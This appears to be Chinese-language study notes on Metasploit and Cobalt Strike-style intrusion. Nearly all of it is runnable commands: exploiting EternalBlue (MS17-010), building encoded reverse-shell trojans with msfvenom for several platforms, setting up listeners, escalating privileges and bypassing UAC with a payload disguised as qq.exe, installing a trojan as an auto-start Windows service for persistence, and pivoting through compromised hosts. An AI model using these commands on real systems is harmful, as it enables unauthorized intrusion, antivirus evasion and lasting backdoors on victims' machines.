MSF

使用新版本的kali，旧版本106无法用，新版本需要vm15以上才可以用

metasploit 攻击框架

msfconsole 打开msf exploits溢出，漏洞； auxiliary辅助，搜集等；nops(No Operation or Next Operation)；post后期渗透模块

nmap -sV 192.168.1.17靶机ip 大概对目标进行扫描，扫描目标主机的端口上运行的软件版本，顺带扫带端口

显示filtered表示对方有防火墙过滤

永恒之蓝漏洞 一旦扫描到目标是win7 135 445开放端口就有可能被利用

metasploit中含有各种漏洞的各种利用方式

永恒之蓝对应的漏洞是ms17-010 （别的漏洞比如古怪地鼠，翡翠纤维……也可利用）

google：影子经纪人 泄露这批漏洞

msf攻击目标所需条件：

1.知道对方有漏洞

2.攻击载荷（木马病毒，自己开发比较好）

msf 开启

use exploit（s） ，旧版本会显示加载失败

display中aix是针对IBM机器的漏洞，multi是多平台，比如浏览器上的flash，http协议的漏洞，misc加密类型的漏洞，osx上safari浏览器的漏洞，solaris系统的漏洞，window的rdp远程桌面的漏洞等，

use exploit/windows/smb/

use exploit/windows/smb/ms17_010_eternalblue 使用该漏洞

show options 查看如何配置漏洞

set RHOSTS [目标ip] 设置目标ip

默认自带攻击载荷（容易被抓）

run 运行 显示win表示成功，meterpreter表示已经拿到控制权

默认的木马功能挺多，使用help查看功能，比如：

shell 返回控制窗口exit退出shell

screenshot 抓取屏幕

exit退出msf

msf木马操作标准流程

msf多数利用在内网渗透

在root目录下（也可以在msf环境中）生成exe木马

msfvenom(毒液，msf生成木马) -a x86 -platform windows -p(payload攻击载荷) windows/meterpreter/reverse_tcp LHOST=[自己ip] LPORT=4444 -b “\00”(对程序中00进行处理) -e（encode加密编码）（用后面的进行伪装，伪装也不好用了） x86/shikata_ga_nai -f exe > msf.exe（生成并加密程序）

将生成的木马发给目标主机（火绒瞬间处理掉。。。）

进入msf，建立木马的控制端：

msfconsole

use exploit/multi/handler

set payload windows/meterpreter/reverse_tcp (这里需要设置和木马中匹配的漏洞)

show options

set LHOST [自己ip]

exploit （进入监听状态）

如果木马上线就就会连接我，这边会显示meterpreter，输入shell就可以获取目标cmd

退出meterpreter时exit是关闭木马，后台木马是background，生成session

使用sessions查看控制了多少人

sessions -i 1 进入1号主机的控制端

jobs 查看当前在执行多少工作，有时候用好几种攻击方式一起放在后台工作，就会产生job

back 后退一格，这时就可在msf后端做别的任务，使用sessions还可以查看当前攻击列表

如果不小心exit木马，从use exploit/multi/handler开始，使用exploit开始监听

生成其他木马命令

生成mac木马：

msfvenom -a x86 –platform osx -p osx/x86/shell_reverse_tcp LHOST=自己ip LPORT=4444 -f macho(生成什么类型的) -o payload.macho

这个是比较老版本的苹果木马（苹果比较先进）

生成android木马（需要数字签名）：（）其实用kali做木马本身就很蠢）

msfvenom -a x86 –platform Android -p android/meterpreter/reverse_tcp LHOST=自己ip LPORT=4444 -f apk -o payload.apk

生成powershell木马，（windows的powershell做的越往后面越像高级的cmd）所以也有针对此的木马

msfvenom -a x86 –platform windows -p windows/powershell_reverse_tcp LHOST =自己ip LPORT=4444 -e cmd/powershell_base64 -i 3 -f raw -o payload.ps1

生成linux的：

msfvenom -a x86 –platform Linux -p linux/x86/meterpreter/reverse_tcp LHOST=自己ip LPORT=4444 -f elf -o payload.elf

生成python木马（攻击载荷这里都是开源的，linux自带python，可以对开源的载荷进行修改）：

msfvenom -p python/meterpreter/reverse_tcp LHOST=自己ip LPORT=4444 -f raw -o payload.py

meterpreter基本操作

getuid 查看木马当前权限

getsystem 直接提权（有风险，有可能会报错，被发现，也有可能因为权限不够提权，导致function不被support，即被发现）

UAC提权：（用户账户控制，这个权限越高，越会通知东西）

利用一个针对UAC的漏洞进行提权

考虑使用ask模块提权

background 木马进入后台 用sessions命令查看

use exploit/windows/local/ask 加载ask模块

info 查看漏洞信息

show options

set SESSION 2 使用进程2的木马（就是之前的木马）

set FILENAME qq.exe 伪装成qq

set LHOST 自己ip

exploit 运行，会在用户桌面上弹出一个允许qq启动，用户选择yes，成功（演示从a普通用户提权到管理员权限）

此时getuid发现不是system，再用getsystem提高到最高

uac绕过提权（成功率不高）

use exploit/windows/local/bypassuac (多用来攻击32位系统)

show options

set SESSION 1

exploit 开始攻击

如果攻击成功会给你一个新的session号

（在win7版本中需要目标用户有一个administrator的身份才可以，而且UAC不能一直是最高，这是截至目前发现的）

进入新的session号

getuid

getsystem

服务权限维持

    beacon在内存中容易被发现
    伪装
    win：注册表，启动项，计划任务，服务，shift，放大镜，其他安装的软件
    肉鸡上线后，
    attack-packages-windows executable(s)   生成第二个木马exe，作为我们二段跳，

    upload /root/b.exe，(之后可以设置b.exe运行后自动删除)可把该exe程序放到c:\windows\temp\ 
    将其写到服务中
    shell sc creat "thisserver" binpath="c:\windows\temp\b.exe" 创建服务并关联
    shell sc description "thisserver" "weizhuangfuwumingcheng"
    shell sc config "thisserver" start=auto 开机自启
    shell net start "thisserver" 启动服务
    木马上线

    服务器重启之后，之前肉鸡木马失效，但写入自启服务的会上线

多层连接

多层类似第一层

正向连接

    server1已上线，
    生成一个listeners， payload使用beacon tcp    4444端口即可
    attacks-packages-windows executable(s)  (s)这里可以使用tcp，  生成后直接放到server2上
    但在server1的beacon的interact中没发现上线
    connect 172.16.214.141   之后上线

反向连接

多层反向连接（多用）
    反向更好规避防火墙查杀，溯源难度大点
    server1 中招
    beacon 右键 pivoting listener   此时中间人的4444端口充当hack转发器
    选用中间人listener
    attacks-packages-windows executable(s)  选择server1的listener，生成beacon，想办法在目标机器上运行
    运行后直接上线
